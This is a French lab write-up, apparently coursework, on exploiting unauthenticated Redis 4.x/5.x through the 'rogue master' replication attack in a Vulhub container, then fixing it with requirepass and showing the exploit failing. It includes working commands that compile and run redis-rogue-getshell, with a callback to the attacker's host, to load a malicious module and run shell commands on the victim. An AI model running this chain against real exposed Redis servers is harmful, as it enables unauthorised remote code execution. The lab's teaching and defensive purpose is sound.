# Redis Post Exploitation Due to Master and Slave Synchronisation
## Présentation du logiciel

Redis est une base de données en mémoire à haute performance de type clé-valeur, principalement utilisée pour la mise en cache, la gestion des sessions et d'autres applications nécessitant une réponse rapide. Il stocke les données en mémoire, ce qui le rend exceptionnellement rapide et fiable, et prend en charge des structures de données polyvalentes comme les chaînes, les listes, les ensembles et les hachages.  

## Chargement de l'image Vulhub

Nous utilisons l'environnement Vulhub pour déployer une version vulnérable de Redis (4.x/5.x) via Docker.

### Création et lancement du conteneur
```
git clone https://github.com/vulhub/vulhub
cd vulhub/redis/4-unacc
sudo docker-compose up -d
```

### Vérification du fonctionnement
Nous vérifions que le serveur est accessible sans restriction.
```
redis-cli -h ip-du-serveur
```
Cela devrait retourner l'invite de commande redis.

## Présentation de la vulnérabilité

La vulnérabilité réside dans une mauvaise configuration par défaut des versions Redis 4.x et 5.x. Le service est lié à l'interface 0.0.0.0 sans mécanisme d'authentification activé et avec le "Protected Mode" désactivé.

Cela permet à un attaquant non authentifié d'utiliser les commandes SLAVEOF (pour la réplication) et CONFIG (pour la configuration) à distance. En combinant ces accès avec la fonctionnalité de chargement dynamique de modules, un attaquant peut obtenir une exécution de code à distance (RCE).

## Exploit de la vulnérabilité

Nous utilisons l'outil [redis-rogue-getshell]() qui automatise l'attaque "Rogue Master"

### Préparation de l'outil
Nous clonons le dépôt. Notez qu'une modification du code source est nécessaire sur les systèmes récents pour éviter une erreur de compilation.
```
git clone https://github.com/vulhub/redis-rogue-getshell
cd redis-rogue-getshell
nano /home/kali/vulhub/redis/4-unacc/redis-rogue-getshell/RedisModulesSDK/exp/exp.c
```

```c
#include <string.h>
#include <arpa/inet.h>
```

### Compilation du code malveillant
```
cd ../
make
cd ../
```
### Execution de l'attaque

Nous lançons le script Python en définissant l'IP de la victime (-r) et notre IP d'attaquant (-L) pour le callback.

Test 1 : Obtention de l'identité (Preuve RCE)
```
python3 redis-master.py -r <ip-attaquant> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "id"
```

Test 2 : Création de fichier (Preuve de persistance)
```
python3 redis-master.py -r <ip-victime> -p 6379 -L <ip-attaquant> -P 8888 -f RedisModulesSDK/exp.so -c "touch /tmp/PreuveDeHack"
```
On peut ensuite vérifier sur la victime que le fichier /tmp/PreuveDeHack existe.
```
sudo docker exec -it <id-du-conteneur> ls -l /tmp/
```

## Explication de la raison pour laquelle l’exploit fonctionne

L'exploit repose sur la chaîne d'événements suivante, rendue possible par l'absence d'authentification :

1. Imitation du Maître : Le script d'attaque se comporte comme un serveur Redis Maître et envoie la commande SLAVEOF à la victime. La victime, configurée sans sécurité, accepte de devenir l'esclave de l'attaquant.

2. Synchronisation Malveillante : Le protocole de réplication Redis impose une synchronisation complète. L'attaquant envoie alors le module malveillant (exp.so) sous forme de flux de données binaires, que la victime écrit sur son disque.

3. Chargement de Module : Une fois le fichier sur le disque, l'attaquant envoie la commande MODULE LOAD ./exp.so. Redis charge ce code compilé en mémoire.

4. Exécution : Le module chargé ajoute une nouvelle commande (ici system.exec) qui permet de passer des commandes directement au système d'exploitation sous l'identité de l'utilisateur Redis.


## Proposition justifiée d’un correctif

Conformément aux contraintes, nous ne pouvons pas mettre à jour le logiciel. Nous devons sécuriser la configuration.

Solution : Activer l'authentification (requirepass).

Justification : En définissant un mot de passe fort, le serveur Redis rejettera toutes les commandes non authentifiées. Cela empêche l'attaquant d'initier la commande SLAVEOF ou CONFIG. Si l'attaquant ne peut pas forcer la synchronisation, il ne peut pas envoyer son module malveillant, neutralisant ainsi totalement la chaîne d'attaque à sa première étape.

## Application du correctif

L'image Docker utilisée étant minimaliste (pas d'éditeur de texte ni de fichier redis.conf par défaut), nous appliquons le correctif directement en mémoire via la commande CONFIG SET. Cela sécurise le serveur immédiatement sans redémarrage.

Sur la VM victime :
```
edis-cli -h 127.0.0.1                                   
127.0.0.1:6379> CONFIG SET requirepass "Securite123!"
OK
127.0.0.1:6379> exit
```

## Démonstration que l’exploit ne fonctionne plus

### Vérification manuelle
Nous tentons de lister les clés sans mot de passe. L'accès doit être refusé.
```
edis-cli -h 192.168.125.128                            
192.168.125.128:6379> KEYS *
(error) NOAUTH Authentication required.
192.168.125.128:6379> exit
```

### Échec du script d'attaque
Nous relançons le script d'exploitation. Celui-ci échoue désormais car il ne peut plus s'authentifier pour envoyer les commandes de configuration.
```
python3 redis-master.py -r 192.168.125.128 -p 6379 -L 192.168.125.129 -P 8888 -f RedisModulesSDK/exp.so -c "id"
```
Sortie observée : 
```
>> send data: b'*3\r\n$7\r\nSLAVEOF\r\n$15\r\n192.168.125.129\r\n$4\r\n8888\r\n'
>> receive data: b'-NOAUTH Authentication required.\r\n'
>> send data: b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
>> receive data: b'-NOAUTH Authentication required.\r\n'
```
L'attaque est bloquée par l'erreur NOAUTH.
